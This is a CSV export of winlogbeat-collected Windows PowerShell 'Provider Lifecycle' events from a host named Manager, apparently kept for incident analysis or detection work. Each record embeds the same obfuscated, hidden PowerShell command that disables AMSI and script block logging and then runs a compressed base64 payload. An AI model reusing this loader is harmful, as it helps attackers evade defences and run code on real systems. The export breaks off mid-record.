[Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6175,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.136",BHkLBIQByII7dpeEYg6R,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA'+'4M'+'peEYdiluJRltrUJfrOpn5+ePFFNAz'+'MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p'+'HjvvNJQ17rAn'+'7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S'+'r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG'+'N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0'+'fnY1Hl3q{1}fIU{1}bY'+'X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx'+'3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef'+'p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS'+'WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M'+'pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}')-f'=','s')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6176,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:46.125",AHkLBIQByII7dpeEYg6R,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:46.534","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=61ec158e-0cbb-4d5a-9912-13e0fca2652b
	HostApplication=C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -noni -nop -w hidden -c $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=(('{5}na{3}'+'leSc{4}i{1}tBlo'+'c'+'kIn'+'{0}'+'ocation{2}og'+'ging'+'')-f'v','p','L','b','r','E'); $eut=[Ref].Assembly.GetType((('{'+'6'+'}'+'{2}'+'st{'+'9'+'}m.'+'{5}'+'ana'+'{1}{'+'9}m{9}nt.{'+'8}{0}'+'t{7}m'+'a'+'t'+'i'+'{7'+'}n.'+'{8}m'+'s'+'i{4}ti{3}s')-f'u','g','y','l','U','M','S','o','A','e')); $oFs1=(('En{2}b'+'l{1}Sc{3}i'+'ptBl'+'o'+'c{0}Logging'+'')-f'k','e','a','r'); if ($eut) { $eut.GetField((('a{2}si{1'+'}'+'{'+'0}'+'i{'+'4}Faile{'+'3'+'}'+'')-f'n','I','m','d','t'),'NonPublic,Static').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType((('{'+'5}{2}ste'+'m.{1}anagement.'+'{'+'3}{0}t'+'omat'+'ion.{'+'4}tils')-f'u','M','y','A','U','S')); $hagi=(('Scri'+'pt'+'{'+'0}lock{1}og'+'gi{2}g')-f'B','L','n'); $fQpa=$q6h.GetField('cachedGroupPolicySettings','NonPublic,Static'); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''+'Sy{0}'+'tem.Manag'+'ement.{2}{5}tomati'+'on'+'.Scri{'+'1}t'+'B{4}oc{3'+'}')-f's','p','A','k','l','u')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb'+'gx0SJalyJ9VS'+'wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk'+'kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q'+'p'+'Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W'+'K2QdwmYcTHIgU5J'+'cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSl